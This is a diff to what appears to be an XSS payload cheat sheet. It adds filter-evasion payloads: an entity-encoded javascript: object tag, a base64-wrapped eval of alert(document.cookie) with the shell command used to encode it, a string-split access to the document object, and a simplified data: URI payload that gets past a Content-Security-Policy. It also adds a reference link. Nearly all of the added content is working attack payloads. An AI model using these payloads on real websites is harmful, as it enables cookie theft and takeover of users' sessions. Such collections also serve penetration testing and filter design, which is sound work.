@@ -191,6 +191,7 @@ Most tools are also suitable for blind XSS attacks:
 <script>\u0061lert('22')</script>
 <script>eval('\x61lert(\'33\')')</script>
 <script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
+<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
 
 // Img payload
 <img src=x onerror=alert('XSS');>
@@ -662,6 +663,12 @@ You can bypass a single quote with &#39; in an on mousedown event handler
 Convert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777`
 http://www.geektools.com/cgi-bin/ipconv.cgi
 
+```javascript
+<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
+```
+
+Base64 encoding your XSS payload with Linux command: IE. `echo -n "alert(document.cookie)" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`
+
 ### Bypass parenthesis for string
 
 ```javascript
@@ -724,6 +731,7 @@ $ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
 
 ```javascript
 <div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
+window["doc"+"ument"]
 ```
 
 ### Bypass using javascript inside a string
@@ -1071,10 +1079,10 @@ Works for CSP like `script-src self`
 
 ### Bypass CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)
 
-Works for CSP like `script-src 'self' data:`
+Works for CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).
 
 ```javascript
-<script ?/src="data:+,\u0061lert%281%29">/</script>
+<script src="data:,alert(1)">/</script>
 ```
 
 
@@ -1247,3 +1255,4 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
 - [Self Closing Script](https://twitter.com/PortSwiggerRes/status/1257962800418349056)
 - [Bypass < with ＜](https://hackerone.com/reports/639684)
+- [Bypassing Signature-Based XSS Filters: Modifying Script Code](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code)
